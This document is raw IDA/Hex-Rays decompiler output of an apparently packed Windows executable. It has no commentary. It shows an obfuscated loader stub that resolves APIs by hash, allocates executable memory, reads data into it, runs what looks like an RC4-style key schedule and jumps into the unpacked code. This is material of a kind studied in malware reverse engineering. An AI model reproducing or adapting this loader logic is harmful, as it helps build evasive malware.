int (__fastcall *__usercall sub_405A5B@<eax>(int a1@<edx>, int a2@<ebx>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
{
  int v2; // edx
  int v3; // ecx
  char v4; // al
  _BYTE *v5; // edi
  int v6; // esi
  int v7; // ebx
  int v8; // ecx
  int v9; // ebx
  int v10; // esi
  int v11; // edi
  int (__fastcall *result)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v13; // edx
  __int16 v14; // si
  int v15; // ebx
  int v16; // ecx
  int v17; // edx
  int v18; // edi
  int v19; // ecx
  void (__stdcall **v20)(LPCRITICAL_SECTION); // edx
  int v21; // ecx
  unsigned int v22; // ebx
  int v23; // eax
  int v24; // edx
  int v25; // edi
  int v26; // ebx
  int v27; // edx
  char v28; // al
  int v29; // eax
  bool v30; // cf
  int v31; // edi
  int v32; // ebx
  _BYTE *v33; // edi
  FARPROC (__stdcall **v34)(HMODULE, LPCSTR); // esi
  int v35; // ecx
  _BYTE *v36; // esi
  int v37; // edx
  int v38; // ecx
  char *v39; // ebx
  int v40; // edx
  int v41; // eax
  int v42; // ecx
  int v43; // edx
  int v44; // ecx
  unsigned int v45; // edi
  int v46; // ecx
  int v47; // ecx
  int v48; // edx
  int v49; // ecx
  unsigned int v50; // edi
  int v51; // ecx
  char v52; // dl
  int v53; // edx
  void (__stdcall **v54)(LPCRITICAL_SECTION); // ebx
  _BYTE *v55; // edi
  char *v56; // ecx
  __int16 v57; // si
  int v58; // [esp-8h] [ebp-8h]
  __int16 v59; // [esp-4h] [ebp-4h]
  int v60; // [esp-4h] [ebp-4h]
  int v61; // [esp-4h] [ebp-4h]

  v54 = (void (__stdcall **)(LPCRITICAL_SECTION))(__CFADD__(dword_43DA38, a1) + a2 + 24399);
  v47 = 0x2000;
  LOBYTE(v54) = byte_43D378 + (_BYTE)v54;
  v55 = &unk_42372A;
  do
  {
    BYTE1(v54) = byte_43D488;
    v60 = v47;
    dword_43D02C = 20733;
    LOBYTE(dword_43D018) = dword_43D018 - 61;
    dword_43D024 -= (int)&GetProcAddress;
    sub_405422(v47, (int)&GetProcAddress);
    LOBYTE(dword_43D024) = dword_43D024 + 115;
    dword_43D014 = 27040;
    *v55++ = v28;
    dword_43D034 += (int)v54;
    v54 = &DeleteCriticalSection;
    v47 = v60 - 1;
  }
  while ( v60 != 1 );
  v22 = dword_43E49C;
  v23 = dword_43E6CC(dword_43E200, 255, &unk_42362A);
  BYTE1(v23) -= byte_43D848;
  LOBYTE(v24) = 4;
  v30 = dword_43D038 < v22;
  dword_43D038 -= v22;
  v25 = (int)&v55[v30 + 6056];
  v26 = dword_43E5DC;
  v30 = __CFADD__(v25, dword_43D048);
  dword_43D048 += v25;
  dword_43E6FA(
    v30 + v38 + 25230,
    v24 - (__CFADD__(dword_43D4CC, v23) + 12650) - dword_43E1C4,
    &unk_42362A,
    &unk_43E6F4,
    0,
    &unk_43E5CD);
  v39 = (char *)off_43DED4 + v26;
  v56 = v39 + 28604;
  dword_43D044 -= (int)v39;
  dword_43D038 = (int)(v39 + 28604);
  v40 = dword_43DAE4;
  BYTE1(v40) = byte_43E600;
  LOBYTE(dword_43D008) = dword_43D008 - 40;
  BYTE1(v56) = ((unsigned __int16)((_WORD)v39 + 28604) >> 8) + 103;
  dword_43D004 = 0;
  v41 = dword_43E74A(
          &v56[__CFADD__((unsigned __int16)((_WORD)v39 + 28604) >> 8, 103) + 22117],
          dword_43D988 + v40 + 1,
          &unk_43E5CD,
          -1073741824,
          1,
          0,
          2,
          32,
          0);
  dword_43D024 += v42;
  dword_43D00C = v27;
  LOBYTE(v42) = -36;
  v7 = dword_43D63C;
  dword_43E766(v42, (char *)&DeleteCriticalSection - 1, v41, &unk_42372A, 0x2000, &dword_43E78D, 0, v41);
  LOBYTE(v53) = v52 - byte_43D874;
  dword_43D038 = v7;
  dword_43E5C5(v21 + 1, v53);
  LOBYTE(dword_43D02C) = dword_43D02C + 23;
  v2 = 1;
  BYTE1(v7) -= byte_43D6F4;
  dword_43D048 = v7;
  LOBYTE(dword_43D004) = dword_43D004 + 52;
  LOBYTE(dword_43D004) = dword_43D004 + 75;
  v8 = 0x2000;
  v5 = &unk_42372A;
  LOBYTE(v7) = v7 - 98;
  v6 = 11293;
  LOBYTE(dword_43D020) = dword_43D020 + 126;
  do
  {
    BYTE1(v7) += byte_43E05C;
    v58 = v8;
    sub_405422(v8, v2);
    dword_43D044 = v7 - 1;
    *v5++ = v4;
    v6 = (int)&v5[v3 ^ v6];
    LOBYTE(dword_43D030) = 60;
    v7 = dword_43D868;
    v8 = v58 - 1;
  }
  while ( v58 != 1 );
  v30 = (unsigned __int8)dword_43D02C < 0x8Du;
  LOBYTE(dword_43D02C) = dword_43D02C + 115;
  v9 = v30 + dword_43D868 + 12667;
  dword_43D024 = 31858;
  v10 = (__CFADD__(v30, dword_43D868) | __CFADD__(v30 + dword_43D868, 12667)) + dword_43E0B8 + 19063;
  v11 = (int)&v5[v8];
  dword_43D018 += v10;
  result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(
                                                                                 (char)&DeleteCriticalSection,
                                                                                 v9,
                                                                                 1769630462);
  v14 = v10 - dword_43D840;
  v15 = v9 - (_DWORD)result;
  if ( result )
  {
    dword_43D028 = v11;
    dword_43E78D = result;
    dword_43D03C += 25099;
    dword_43D024 = v15;
    dword_43D040 = dword_43E314 + v13;
    v57 = v14 - (__CFADD__(dword_43E314, v13) + v59);
    result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_405794(v59, v15, 976580703);
    LOBYTE(dword_43D024) = dword_43D024 - 13;
    if ( result )
    {
      dword_43E70E = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
      dword_43D03C = v57 & 0x53EE;
      v18 = dword_43E484;
      dword_43D044 += 13255;
      result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))dword_43E78D(
                                                                                     &GetProcAddress,
                                                                                     &DeleteCriticalSection,
                                                                                     0,
                                                                                     0x2000,
                                                                                     12288,
                                                                                     64);
      dword_43D02C -= 4195;
      dword_43D014 = v18;
      if ( result )
      {
        dword_43E569 = (int)result;
        dword_43D034 -= v19;
        v20 = &DeleteCriticalSection;
        BYTE1(v20) = byte_43EA7C;
        v51 = ((unsigned int)v20 < 0x55E5) + v19 + 30600;
        dword_43D028 = 22596;
        BYTE1(v51) = byte_43D6B0;
        v61 = dword_43E74A(v51, &DeleteCriticalSection, &unk_43E5CD, -1073741824, 1, 0, 3, 0, 0);
        LOBYTE(dword_43D034) = 43;
        LOBYTE(v48) = v48 - 56;
        v49 = 24607;
        dword_43D040 += v48;
        v50 = (_DWORD)((char *)&GetProcAddress - __CFSHL__(26680, 3) - 23150) << 6;
        LOBYTE(dword_43D048) = dword_43D048 - 35;
        BYTE1(v49) = byte_43D928 - 49;
        dword_43E702(v49, v61, dword_43E569, 0x2000, &unk_42362A, 0, v61);
        dword_43D03C = 13182;
        dword_43E5C5(v44, v43);
        v30 = v50 < (unsigned int)off_43D900;
        v45 = v50 - (_DWORD)off_43D900;
        dword_43E752(v30 + v46 + 21271, &unk_43E5CD);
        v30 = __CFADD__(dword_43D03C, 10432);
        dword_43D03C += 10432;
        dword_43D04C = (int)&DeleteCriticalSection;
        v35 = 0x2000;
        v36 = (_BYTE *)dword_43E569;
        v37 = 0;
        LOBYTE(dword_43D010) = -120;
        v29 = 0;
        v31 = ((__CFADD__(__CFADD__(v30, v45) | __CFADD__(v30 + v45, 14095), &DeleteCriticalSection) | __CFADD__((char *)&DeleteCriticalSection + (__CFADD__(v30, v45) | __CFADD__(v30 + v45, 14095)), 20478))
             + v30
             + v45
             + 14095
             + 16866) | 0x5E5E;
        v30 = 0;
        do
        {
          LOBYTE(v29) = *v36++;
          dword_43D00C = v30 + v31 + 771;
          v37 += v29;
          v29 = 0;
          v31 += v30 + 34694;
          v30 = __CFADD__(dword_43D038, 23898);
          dword_43D038 += 23898;
          dword_43D030 = v31;
          --v35;
        }
        while ( v35 );
        dword_43E73E = v37;
        LOBYTE(dword_43D01C) = dword_43D01C + 12;
        v32 = dword_43DF6C;
        dword_43E70E((char *)&GetProcAddress - dword_43E0BC, 8421, dword_43E569, 0, 0x8000);
        dword_43D04C = v32;
        result = 0;
        v16 = 0x2000;
        v17 = dword_43DD5C;
        v33 = &unk_42372A;
        dword_43D01C -= v32;
        v34 = (FARPROC (__stdcall **)(HMODULE, LPCSTR))(dword_43DE84 - dword_43E078);
        do
        {
          v32 += dword_43D608;
          v17 = (__PAIR64__(v17, (unsigned int)v34) - ((unsigned int)off_43E410 | 0x335000000000i64)) >> 32;
          *v33++ = 0;
          v34 = &GetProcAddress;
          --v16;
        }
        while ( v16 );
        dword_43D018 = v17;
      }
    }
  }
  return result;
}
// 40132D: conditional instruction was optimized away because of '%0x18.4==1'
// 4012F0: variable 'v2' is possibly undefined
// 401304: variable 'v4' is possibly undefined
// 4012F5: variable 'v3' is possibly undefined
// 407733: variable 'v13' is possibly undefined
// 407739: variable 'v59' is possibly undefined
// 4015F6: variable 'v19' is possibly undefined
// 405BFF: variable 'v48' is possibly undefined
// 404CC0: variable 'v44' is possibly undefined
// 404CC0: variable 'v43' is possibly undefined
// 404CD3: variable 'v46' is possibly undefined
// 403DBB: variable 'v38' is possibly undefined
// 406F09: variable 'v24' is possibly undefined
// 403E80: variable 'v42' is possibly undefined
// 401B9D: variable 'v27' is possibly undefined
// 4068D5: variable 'v52' is possibly undefined
// 401A57: variable 'v21' is possibly undefined
// 401A58: variable 'v53' is possibly undefined
// 401DA6: variable 'v28' is possibly undefined
// 43D004: using guessed type int dword_43D004;
// 43D008: using guessed type int dword_43D008;
// 43D00C: using guessed type int dword_43D00C;
// 43D010: using guessed type int dword_43D010;
// 43D014: using guessed type int dword_43D014;
// 43D018: using guessed type int dword_43D018;
// 43D01C: using guessed type int dword_43D01C;
// 43D020: using guessed type int dword_43D020;
// 43D024: using guessed type int dword_43D024;
// 43D028: using guessed type int dword_43D028;
// 43D02C: using guessed type int dword_43D02C;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D03C: using guessed type int dword_43D03C;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D048: using guessed type int dword_43D048;
// 43D04C: using guessed type int dword_43D04C;
// 43D378: using guessed type char byte_43D378;
// 43D488: using guessed type char byte_43D488;
// 43D4CC: using guessed type int dword_43D4CC;
// 43D608: using guessed type int dword_43D608;
// 43D63C: using guessed type int dword_43D63C;
// 43D6B0: using guessed type char byte_43D6B0;
// 43D6F4: using guessed type char byte_43D6F4;
// 43D840: using guessed type int dword_43D840;
// 43D848: using guessed type char byte_43D848;
// 43D868: using guessed type int dword_43D868;
// 43D874: using guessed type char byte_43D874;
// 43D900: using guessed type void *off_43D900;
// 43D928: using guessed type char byte_43D928;
// 43D988: using guessed type int dword_43D988;
// 43DA38: using guessed type int dword_43DA38;
// 43DAE4: using guessed type int dword_43DAE4;
// 43DD5C: using guessed type int dword_43DD5C;
// 43DE84: using guessed type int dword_43DE84;
// 43DED4: using guessed type void *off_43DED4;
// 43DF6C: using guessed type int dword_43DF6C;
// 43E05C: using guessed type char byte_43E05C;
// 43E078: using guessed type int dword_43E078;
// 43E0B8: using guessed type int dword_43E0B8;
// 43E0BC: using guessed type int dword_43E0BC;
// 43E1C4: using guessed type int dword_43E1C4;
// 43E200: using guessed type int dword_43E200;
// 43E314: using guessed type int dword_43E314;
// 43E410: using guessed type int *off_43E410;
// 43E484: using guessed type int dword_43E484;
// 43E49C: using guessed type int dword_43E49C;
// 43E569: using guessed type int dword_43E569;
// 43E5C5: using guessed type int (__fastcall *dword_43E5C5)(_DWORD, _DWORD);
// 43E5DC: using guessed type int dword_43E5DC;
// 43E600: using guessed type char byte_43E600;
// 43E6CC: using guessed type int (__thiscall *dword_43E6CC)(_DWORD, _DWORD, _DWORD);
// 43E6FA: using guessed type int (__fastcall *dword_43E6FA)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E702: using guessed type int (__thiscall *dword_43E702)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E70E: using guessed type int (__fastcall *dword_43E70E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E73E: using guessed type int dword_43E73E;
// 43E74A: using guessed type int (__fastcall *dword_43E74A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E752: using guessed type int (__thiscall *dword_43E752)(_DWORD, _DWORD);
// 43E766: using guessed type int (__fastcall *dword_43E766)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E78D: using guessed type int (__fastcall *dword_43E78D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43EA7C: using guessed type char byte_43EA7C;

//----- (00405A77) --------------------------------------------------------
int __usercall sub_405A77@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 64 < 29 )
    result = 284;
  else
    result = 0;
  return result;
}
// 407171: conditional instruction was optimized away because of '%var_2C.4==58'

//----- (00405C6C) --------------------------------------------------------
int __usercall sub_405C6C@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  return sub_404DC1(a1, (int)&savedregs);
}

//----- (00405D2D) --------------------------------------------------------
int __usercall sub_405D2D@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 32;
  v2 = a1 / 32;
  if ( v3 >= 11 )
    return 13;
  sub_407941(v2);
  return 402;
}
// 401563: conditional instruction was optimized away because of '%var_18.4==47'
// 401569: conditional instruction was optimized away because of '%var_18.4==47'

//----- (00405D8A) --------------------------------------------------------
int __usercall sub_405D8A@<eax>(int a1@<eax>)
{
  if ( a1 % 105 < 21 )
    JUMPOUT(0x406B28);
  return 72;
}
// 402F37: control flows out of bounds to 406B28
// 405D8A: could not find valid save-restore pair for edi
// 405D8A: could not find valid save-restore pair for esi
// 402F1E: conditional instruction was optimized away because of '%var_8.4==26'

//----- (00406106) --------------------------------------------------------
int __usercall sub_406106@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int result; // eax

  *(_DWORD *)(a2 - 40) = 187;
  *(_DWORD *)(a2 - 28) = 126;
  *(_DWORD *)(a2 - 36) = 78;
  *(_DWORD *)(a2 - 44) = 126;
  *(_DWORD *)(a2 - 24) = 194;
  *(_DWORD *)(a2 - 8) = 147;
  *(_DWORD *)(a2 - 4) = 79;
  *(_DWORD *)(a2 - 16) = 5;
  *(_DWORD *)(a2 - 32) = 92;
  *(_DWORD *)(a2 - 20) = a1 % 126;
  if ( a1 % 126 < 7 )
    result = 684;
  else
    result = 17;
  return result;
}

//----- (0040627A) --------------------------------------------------------
unsigned int __usercall sub_40627A@<eax>(int a1@<edx>, char a2@<bh>, int a3@<esi>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_43D014 += a3;
  dword_43E742 ^= a1 + 136;
  result = retaddr & 0xFFFF0000;
  dword_43E712 = retaddr & 0xFFFF0000;
  dword_43D04C += (char)(a2 - 93);
  return result;
}
// 43D014: using guessed type int dword_43D014;
// 43D04C: using guessed type int dword_43D04C;
// 43E712: using guessed type int dword_43E712;
// 43E742: using guessed type int dword_43E742;

//----- (004068EE) --------------------------------------------------------
int sub_4068EE()
{
  unsigned int v0; // eax
  unsigned int v1; // edx
  int v2; // eax
  unsigned int v3; // eax
  unsigned int v5; // ecx
  unsigned int v6; // ecx
  int v7; // ecx
  bool v8; // cf
  unsigned int v9; // [esp+28h] [ebp-238h]
  unsigned int v10; // [esp+4Ch] [ebp-214h]
  int v11; // [esp+5Ch] [ebp-204h]
  int v12; // [esp+6Ch] [ebp-1F4h]
  int v13; // [esp+7Ch] [ebp-1E4h]
  int v14; // [esp+90h] [ebp-1D0h]
  unsigned int v15; // [esp+A8h] [ebp-1B8h]
  unsigned int v16; // [esp+BCh] [ebp-1A4h]
  int v17; // [esp+C0h] [ebp-1A0h]
  unsigned int v18; // [esp+C8h] [ebp-198h]
  int v19; // [esp+F8h] [ebp-168h]
  int v20; // [esp+104h] [ebp-15Ch]
  int v21; // [esp+10Ch] [ebp-154h]
  int v22; // [esp+110h] [ebp-150h]
  int v23; // [esp+11Ch] [ebp-144h]
  int v24; // [esp+124h] [ebp-13Ch]
  int v25; // [esp+178h] [ebp-E8h]
  int v26; // [esp+18Ch] [ebp-D4h]
  int v27; // [esp+190h] [ebp-D0h]
  int v28; // [esp+194h] [ebp-CCh]
  int v29; // [esp+1A4h] [ebp-BCh]
  int v30; // [esp+1A4h] [ebp-BCh]
  int v31; // [esp+1D0h] [ebp-90h]
  int v32; // [esp+1ECh] [ebp-74h]
  int v33; // [esp+220h] [ebp-40h]
  int v34; // [esp+224h] [ebp-3Ch]

  if ( v23 != 2927 )
  {
    v10 -= 31054;
    if ( v21 != 6404 )
      v32 += 2927 - v18 + (__PAIR64__(v15, 2927) < __PAIR64__(2927 - v18, v18));
  }
  v1 = v25 & 0x220 ^ 0x6D98;
  if ( v1 > 0x3BA )
  {
    v32 += v1;
    v24 += v19
         + (v1 | 0xFFFFF831)
         + (v25 & 0x220 ^ 0x6A63)
         + 1
         + __CFADD__(v19 + (v1 | 0xFFFFF831), (v25 & 0x220 ^ 0x6A63) + 1);
  }
  v29 = v30 + 1;
  v5 = v34 + ((-v17 | 0x68u) < 0xDEC) + (-v17 | 0x68) - 3564;
  v8 = v10 < v5;
  if ( v10 <= v5 )
  {
    v6 = v32 ^ v26 & v5;
    v31 += v22 + (v6 < v9);
    v7 = v14 ^ v28 ^ v22 ^ ((_WORD)v6 - (_WORD)v9) & 0x62E3;
    v8 = __CFADD__(v20, v7);
    v5 = v20 + v7;
  }
  if ( (v29 | (173 - (v8 + v31))) == v27 )
    v5 = v12 + v24 - 255;
  v0 = v5 + v5 + 1786;
  if ( v0 == 255 )
  {
    v5 = v16;
    v25 &= 0xCB9u;
  }
  v3 = v0 - v5;
  v2 = (v3 | (27479 - v25 - 1)) & (671 - (v3 | (27479 - v25 - 1)));
  if ( v2 == 186 )
    v2 = (v13 | 0xBA) - v33;
  return v11 ^ v2;
}
// 40741B: variable 'v31' is possibly undefined
// 40234B: variable 'v27' is possibly undefined
// 405AA0: variable 'v12' is possibly undefined
// 405A9A: variable 'v24' is possibly undefined
// 401149: variable 'v30' is possibly undefined
// 4029DC: variable 'v25' is possibly undefined
// 40248D: variable 'v32' is possibly undefined
// 4058A3: variable 'v19' is possibly undefined
// 402A7A: variable 'v21' is possibly undefined
// 402A80: variable 'v18' is possibly undefined
// 402A86: variable 'v15' is possibly undefined
// 402B97: variable 'v13' is possibly undefined
// 402B9D: variable 'v33' is possibly undefined
// 404417: variable 'v16' is possibly undefined
// 4048BE: variable 'v11' is possibly undefined
// 4065AF: variable 'v23' is possibly undefined
// 4065B7: variable 'v10' is possibly undefined
// 406FEE: variable 'v34' is possibly undefined
// 406065: variable 'v17' is possibly undefined
// 4062B7: variable 'v26' is possibly undefined
// 4062CC: variable 'v22' is possibly undefined
// 4062C0: variable 'v9' is possibly undefined
// 4062D8: variable 'v14' is possibly undefined
// 4062D2: variable 'v28' is possibly undefined
// 406311: variable 'v20' is possibly undefined

//----- (00406A8D) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned int __cdecl sub_406A8D(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}
// 405110: positive sp value 4 has been found

//----- (00406E72) --------------------------------------------------------
int __usercall sub_406E72@<eax>(int a1@<ebx>)
{
  int v1; // edx
  unsigned __int16 v2; // cx
  char v3; // cf
  int result; // eax

  LOBYTE(dword_43D030) = -124;
  sub_4032C4();
  if ( (unsigned int)v3 + a1 + 9507 >= 0xB )
  {
    LOBYTE(dword_43D018) = 40;
    LOBYTE(dword_43D03C) = dword_43D03C + 115;
    result = sub_4072E5();
  }
  else
  {
    LOBYTE(v2) = v2 - byte_43DBB8;
    sub_405422(v2, v1);
  }
  return result;
}
// 406E85: variable 'v3' is possibly undefined
// 406E94: variable 'v2' is possibly undefined
// 406EA0: variable 'v1' is possibly undefined
// 43D018: using guessed type int dword_43D018;
// 43D030: using guessed type int dword_43D030;
// 43D03C: using guessed type int dword_43D03C;
// 43DBB8: using guessed type char byte_43DBB8;
// 43E752: using guessed type int (__thiscall *dword_43E752)(_DWORD, _DWORD);

//----- (00406F1A) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_406F1A@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // eax
  int v3; // et2

  *(_DWORD *)(a2 - 8) = 191;
  *(_DWORD *)(a2 - 20) = 34;
  *(_DWORD *)(a2 - 12) = 219;
  *(_DWORD *)(a2 - 4) = 211;
  v3 = a1 % 211;
  v2 = a1 / 211;
  *(_DWORD *)(a2 - 16) = v3;
  if ( v3 >= 33 )
    return 138;
  if ( *(int *)(a2 - 12) >= 236 )
    sub_405C6C(v2);
  return 570;
}
// 402A65: positive sp value 4 has been found

//----- (004072E5) --------------------------------------------------------
int sub_4072E5()
{
  int v0; // eax
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  sub_407941(195);
  v0 = dword_43E706 ^ (dword_43E706 << 11);
  v2 = v0;
  dword_43E706 = dword_43E70A;
  dword_43E70A = dword_43E73A;
  sub_407941(v0);
  dword_43E73A = dword_43E565;
  dword_43E565 ^= (v2 >> 8) ^ v2 ^ ((unsigned int)dword_43E565 >> 19);
  return dword_43E565;
}
// 43E565: using guessed type int dword_43E565;
// 43E706: using guessed type int dword_43E706;
// 43E70A: using guessed type int dword_43E70A;
// 43E73A: using guessed type int dword_43E73A;

//----- (00407346) --------------------------------------------------------
int __usercall sub_407346@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int result; // eax

  *(_DWORD *)(a2 - 24) = 152;
  *(_DWORD *)(a2 - 36) = 16;
  *(_DWORD *)(a2 - 8) = 94;
  *(_DWORD *)(a2 - 16) = 192;
  *(_DWORD *)(a2 - 40) = 176;
  *(_DWORD *)(a2 - 28) = a1 % 52;
  if ( a1 % 52 < 17 )
    result = 980;
  else
    result = 61;
  return result;
}

//----- (00407351) --------------------------------------------------------
int __usercall sub_407351@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 236 < 17 )
    result = 153;
  else
    result = 27;
  return result;
}

//----- (0040748C) --------------------------------------------------------
int __usercall sub_40748C@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 148;
  v1 = a1 / 148;
  if ( v2 >= 17 )
    return 72;
  sub_407941(v1);
  return 959;
}
// 401884: conditional instruction was optimized away because of '%var_54.4==94'

//----- (00407540) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_407540@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v3; // eax
  int v4; // edx

  *(_DWORD *)(a2 - 32) = 57;
  *(_DWORD *)(a2 - 24) = 60;
  *(_DWORD *)(a2 - 20) = 205;
  *(_DWORD *)(a2 - 40) = 13;
  *(_DWORD *)(a2 - 4) = 13;
  *(_DWORD *)(a2 - 28) = 186;
  *(_DWORD *)(a2 - 44) = 52;
  *(_DWORD *)(a2 - 16) = 84;
  *(_DWORD *)(a2 - 12) = 222;
  *(_DWORD *)(a2 - 36) = 232;
  *(_DWORD *)(a2 - 52) = 222;
  *(_DWORD *)(a2 - 8) = 52;
  v4 = a1 % 13;
  *(_DWORD *)(a2 - 48) = v4;
  if ( v4 >= 37 )
    return 22;
  if ( *(int *)(a2 - 12) <= 112 )
    *(_DWORD *)(a2 - 4) = *(_DWORD *)(a2 - 20);
  v3 = sub_407941(*(_DWORD *)(a2 - 40) == *(_DWORD *)(a2 - 28));
  sub_404911(v3);
  return 246;
}
// 403151: positive sp value 4 has been found

//----- (00407941) --------------------------------------------------------
int __usercall sub_407941@<eax>(int a1@<eax>)
{
  int result; // eax

  if ( a1 % 19 < 20 )
    result = 639;
  else
    result = 194;
  return result;
}

//----- (00407E13) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall start(int a1@<edx>, int a2@<ecx>, int a3@<ebx>, int a4@<ebp>, int a5@<edi>, int a6@<esi>)
{
  int v6; // edx
  int v7; // eax
  int v8; // ebx
  int v9; // ebx
  unsigned int v10; // esi
  int v11; // eax
  int v12; // edi
  int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // ecx
  HMODULE (__stdcall **v17)(LPCSTR); // ebx
  bool v18; // cf
  char *v19; // eax
  int v20; // edi
  int v21; // eax
  int v22; // eax

  unk_43E5C9 = a3;
  dword_43E795[0] = a6;
  dword_43E5A5 = a5;
  *(int *)((char *)&dword_43E734 + 2) = a1;
  dword_43E762 = a2;
  dword_43E585 = a4;
  v17 = &LoadLibraryA;
  sub_40748C((unsigned int)dword_43E795 ^ 0x1E5B);
  v10 = dword_43EA4C;
  LOBYTE(dword_43D014) = -112;
  v15 = sub_405A77((int)&MultiByteToWideChar);
  BYTE1(v17) = ((unsigned __int16)&LoadLibraryA >> 8) - (v18 + BYTE1(v15));
  dword_43D018 -= 8204;
  if ( v15 > 0x2A10 )
  {
    v10 += (v15 < 0x2A10) + 16737;
    v14 = sub_40748C(v15);
    v15 = v18 + v14 + 31113;
  }
  v18 = v16 < 0x1CE5;
  if ( v16 < 0x1CE5 )
  {
    v18 = __CFADD__(v15, v17);
    v17 = (HMODULE (__stdcall **)(LPCSTR))((char *)v17 + v15);
  }
  LOBYTE(dword_43D00C) = -76;
  while ( 1 )
  {
    v18 = __CFADD__(v18, v10) | __CFADD__(v15, v18 + v10);
    v21 = (int)v17 + 21898;
    LOBYTE(dword_43D044) = 70;
    BYTE1(v17) += v18 + 92;
    v11 = sub_404911(v21);
    v12 = *(int *)((char *)&dword_43E585 + 3);
    v13 = sub_40168A(v11);
    sub_405D2D(v18 + v13 + 19690);
    v20 = dword_43E688 + v12;
    dword_43D018 -= 22956;
    v22 = sub_401D1E(4724);
    LOBYTE(dword_43D040) = 124;
    dword_43D034 -= 24803;
    sub_404911(v22 << 6);
    dword_43D018 = v20;
    v7 = sub_406E72((int)v17);
    v8 = (unsigned __int8)v7;
    BYTE1(v8) = dword_43DB50;
    dword_43D048 = 10576;
    v9 = v8 + 12667;
    dword_43D040 -= v9;
    v6 = dword_43E6F6 - 1;
    if ( dword_43E6F6 == 1 )
      break;
    BYTE1(v7) += dword_43D014;
    v19 = (char *)&dword_43E6F6 + ((v6 ^ (unsigned int)v7) >> 6);
    v17 = (HMODULE (__stdcall **)(LPCSTR))dword_43E80C;
    --dword_43E6F6;
    v10 = (unsigned int)&MultiByteToWideChar ^ 0xBB9;
    dword_43D048 = v6;
    dword_43D024 += 3891;
    if ( dword_43E80C != 3 )
    {
      sub_40168A((int)&dword_43E6F6);
      dword_43D030 -= 209;
      v17 = (HMODULE (__stdcall **)(LPCSTR))dword_43E734;
      v19 = (char *)sub_4068EE();
      LOBYTE(dword_43D018) = dword_43D018 + 79;
    }
    v15 = sub_405D8A((int)v19);
    dword_43D034 = (unsigned int)&MultiByteToWideChar ^ 0xBB9;
    dword_43D01C = 6590;
    dword_43D030 = v15;
  }
  sub_40627A(v7, SBYTE1(v9), 3316);
  __asm { retn }
}
// 408D90: positive sp value 18 has been found
// 4081B8: variable 'v18' is possibly undefined
// 4082AE: variable 'v16' is possibly undefined
// 43D00C: using guessed type int dword_43D00C;
// 43D014: using guessed type int dword_43D014;
// 43D018: using guessed type int dword_43D018;
// 43D01C: using guessed type int dword_43D01C;
// 43D024: using guessed type int dword_43D024;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D048: using guessed type int dword_43D048;
// 43DB50: using guessed type int dword_43DB50;
// 43E585: using guessed type int dword_43E585;
// 43E5A5: using guessed type int dword_43E5A5;
// 43E688: using guessed type int dword_43E688;
// 43E712: using guessed type int dword_43E712;
// 43E734: using guessed type int dword_43E734;
// 43E742: using guessed type int dword_43E742;
// 43E762: using guessed type int dword_43E762;
// 43E80C: using guessed type int dword_43E80C;
// 43EA4C: using guessed type int dword_43EA4C;

//----- (0040862F) --------------------------------------------------------
void __cdecl sub_40862F(char *a1, char *a2)
{
  char v2; // cl

  v2 = *a1;
  *a1 = *a2;
  *a2 = v2;
  JUMPOUT(0x407FF3);
}
// 408642: control flows out of bounds to 407FF3

//----- (00408DDB) --------------------------------------------------------
void __cdecl sub_408DDB(int a1, int a2, _BYTE *a3)
{
  char v3; // cl
  unsigned int v4; // esi
  _BYTE *v5; // eax

  v4 = 0;
  v5 = a3;
  do
  {
    v3 = v4++;
    *v5++ = v3;
  }
  while ( v4 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  JUMPOUT(0x4083D4);
}
// 408881: control flows out of bounds to 4083D4

//----- (00408DF2) --------------------------------------------------------
void __cdecl sub_408DF2(int a1, int a2, int a3)
{
  JUMPOUT(0x4083E3);
}
// 408E1B: control flows out of bounds to 4083E3

//----- (0040F5B8) --------------------------------------------------------
void __noreturn sub_40F5B8()
{
  JUMPOUT(0x70CECB5D);
}
// 40F5BA: control flows out of bounds to 70CECB5D
// 40F5B8: using guessed type void __noreturn sub_40F5B8();

